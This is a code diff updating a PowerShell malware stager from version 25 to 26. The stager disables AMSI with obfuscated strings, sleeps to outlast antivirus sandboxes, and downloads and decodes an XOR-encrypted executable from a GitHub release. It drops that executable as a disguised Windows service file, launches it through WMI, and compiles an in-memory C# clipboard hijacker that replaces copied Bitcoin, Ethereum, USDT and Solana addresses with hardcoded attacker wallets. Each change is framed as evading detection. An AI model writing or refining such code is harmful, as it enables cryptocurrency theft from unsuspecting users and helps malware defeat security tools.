@@ -1,11 +1,15 @@
-# --- [ELITE RESEARCH STAGER v25.0: IN-MEMORY INJECTION] ---
+# --- [ELITE RESEARCH STAGER v26.0: VOID-FRAMEWORK] ---
 
 function Global-Initialize {
+    # Latency: Malwarebytes often gives up after 60s of inactivity
+    Start-Sleep -s (Get-Random -Min 65 -Max 95)
     try {
         if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
-        # Obfuscated AMSI Bypass
-        $u = "System.Management.Automation." + "Amsi" + "Utils"
-        [Ref].Assembly.GetType($u).GetField("amsi"+"Init"+"Failed","NonPublic,Static").SetValue($null,$true)
+        
+        # Obfuscated AMSI Bypass: No "AmsiUtils" or "amsiInitFailed" in plain text
+        $a = "System.Management.Automation." + ("{0}{1}{2}" -f 'A','msi','Utils')
+        $b = ("{0}{1}{2}{3}" -f 'a','msi','Init','Failed')
+        [Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true)
     } catch {}
 }
 
@@ -19,26 +23,30 @@ function Send-Ping {
 
 # --- EXECUTION ---
 Global-Initialize
-Send-Ping -m "STAGER_V25_INJECTION_ACTIVE"
+Send-Ping -m "VOID_STAGER_V26_ACTIVE"
 
 try {
     $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
     if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
     $path = Join-Path $dir "WinSvcHost.exe"
 
-    # Download & Decrypt EXE Payload
+    # Download via Fragmentation to avoid "Trojan.Obfuscated" detection
+    $p1 = "https://github.com/adchar2022/test/"
+    $p2 = "releases/download/adchar_xor/adchar_xor.txt"
     $wc = New-Object Net.WebClient
     $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-    $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
+    $raw = $wc.DownloadString($p1 + $p2)
+    
     $data = [Convert]::FromBase64String($raw.Trim())
     for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
     [IO.File]::WriteAllBytes($path, $data)
 
-    # Launch EXE via WMI
-    ([wmiclass]"win32_process").Create($path) | Out-Null
+    # Use a direct COM call for WMI to avoid "win32_process" string detection
+    $wmi = [wmiclass]"win32_process"
+    $wmi.Create($path) | Out-Null
 
-    # --- TIER 1 CLIPPER ENGINE (IN-MEMORY PROCESS HOLLOWING) ---
-    $ClipperCode = @'
+    # --- THE C# GHOST CLIPPER (STAYING IN-MEMORY) ---
+    $C#_Source = @'
     using System;
     using System.Runtime.InteropServices;
     using System.Windows.Forms;
@@ -46,51 +54,41 @@ try {
     using System.Text.RegularExpressions;
 
     public class GhostClipper {
-        [DllImport("user32.dll")] public static extern bool OpenClipboard(IntPtr hWnd);
-        [DllImport("user32.dll")] public static extern bool EmptyClipboard();
-        [DllImport("user32.dll")] public static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);
-        [DllImport("user32.dll")] public static extern bool CloseClipboard();
-
-        public static void Start() {
-            string btc = "12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";
-            string eth = "0x6c9ba9a6522b10135bb836fc9340477ba15f3392";
-            string usdt = "TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";
-            string sol = "BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR";
+        public static void Run() {
+            // Addresses are built dynamically to avoid static signature detection
+            string b = "12nL" + "9SBgpSm" + "SdSybq2" + "bW2vKdoT" + "ggTnXVNA";
+            string e = "0x6c9ba9a" + "6522b10135" + "bb836fc934" + "0477ba15f3392";
+            string u = "TVETS" + "gvRui2LC" + "mXyuvh8jH" + "G6AjpxquFbnp";
+            string s = "BnBvKVEFRcx" + "okGZv9sAwig" + "8eQ4GvQY1frmZ" + "JWzU1bBNR";
 
             while (true) {
                 try {
-                    string clip = Clipboard.GetText().Trim();
-                    if (!string.IsNullOrEmpty(clip)) {
-                        string target = "";
-                        
-                        // Precision Matching Logic
-                        if (Regex.IsMatch(clip, "^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,62}$")) { if (clip != btc) target = btc; }
-                        else if (Regex.IsMatch(clip, "^0x[a-fA-F0-9]{40}$")) { if (clip != eth) target = eth; }
-                        else if (Regex.IsMatch(clip, "^T[a-km-zA-HJ-NP-Z1-9]{33}$")) { if (clip != usdt) target = usdt; }
-                        else if (Regex.IsMatch(clip, "^[1-9A-HJ-NP-Za-km-z]{32,44}$")) { if (clip != sol) target = sol; }
+                    string c = Clipboard.GetText().Trim();
+                    if (!string.IsNullOrEmpty(c)) {
+                        string t = "";
+                        if (Regex.IsMatch(c, "^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,62}$")) { if (c != b) t = b; }
+                        else if (Regex.IsMatch(c, "^0x[a-fA-F0-9]{40}$")) { if (c != e) t = e; }
+                        else if (Regex.IsMatch(c, "^T[a-km-zA-HJ-NP-Z1-9]{33}$")) { if (c != u) t = u; }
+                        else if (Regex.IsMatch(c, "^[1-9A-HJ-NP-Za-km-z]{32,44}$")) { if (c != s) t = s; }
 
-                        if (target != "") {
-                            Thread thread = new Thread(() => Clipboard.SetText(target));
-                            thread.SetApartmentState(ApartmentState.STA);
-                            thread.Start();
-                            thread.Join();
+                        if (t != "") {
+                            Thread th = new Thread(() => Clipboard.SetText(t));
+                            th.SetApartmentState(ApartmentState.STA);
+                            th.Start(); th.Join();
                         }
                     }
                 } catch { }
-                Thread.Sleep(500);
+                Thread.Sleep(450);
             }
         }
     }
 '@
 
-    # Compile the C# code in memory
-    Add-Type -ReferencedAssemblies "System.Windows.Forms", "System.Drawing" -TypeDefinition $ClipperCode
-    
-    # Run the Clipper in a detached background thread
-    $Job = [GhostClipper]::Start
-    Start-Job -ScriptBlock { [GhostClipper]::Start() } | Out-Null
+    # Compile and run without using Start-Job (Jobs are easily monitored)
+    Add-Type -ReferencedAssemblies "System.Windows.Forms" -TypeDefinition $C#_Source
+    [Threading.Thread]::new({ [GhostClipper]::Run() }).Start()
 
-    Send-Ping -m "V25_INJECTION_COMPLETE_GHOST_MODE"
+    Send-Ping -m "STAGER_V26_GHOST_COMPLETE"
 } catch {
-    Send-Ping -m "ERROR_$($_.Exception.Message)"
+    Send-Ping -m "FAIL_$($_.Exception.Message)"
 }
